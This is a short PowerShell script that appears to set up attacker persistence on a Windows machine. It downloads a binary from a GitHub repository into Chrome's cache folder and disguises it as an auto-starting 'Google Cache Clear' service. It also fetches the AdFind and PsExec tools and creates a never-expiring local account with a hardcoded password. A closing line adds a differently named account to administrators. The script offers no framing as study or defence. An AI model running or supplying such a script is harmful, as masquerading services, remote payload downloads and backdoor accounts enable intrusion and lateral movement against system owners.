New-Item -ItemType Directory -Force -Path "C\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cache"
Wget "https://github.com/cudkajak/storage_unit13/blob/main/tools/google_cache_clear.exe?raw=true" -OutFile "C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cache\google_cache_clear_service.exe"
Wget "https://github.com/cudkajak/storage_unit13/blob/main/tools/AdFind.exe?raw=true" -OutFile "C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cache\AdFind.exe"
Wget "https://github.com/cudkajak/storage_unit13/blob/main/tools/PsExec.exe?raw=true" -OutFile "C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cache\PsExec.exe"

New-Service -Name "google_cache_clear" -DisplayName "Google Cache Clear" -Description "Service clears unused data from google chrome cache" -StartupType "Automatic" -BinaryPathName "C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cache\google_cache_clear_service.exe"

#new User
net user google_cache_account Igoty0u /add /expires:never
net localgroup administrators mylocaladmin /add

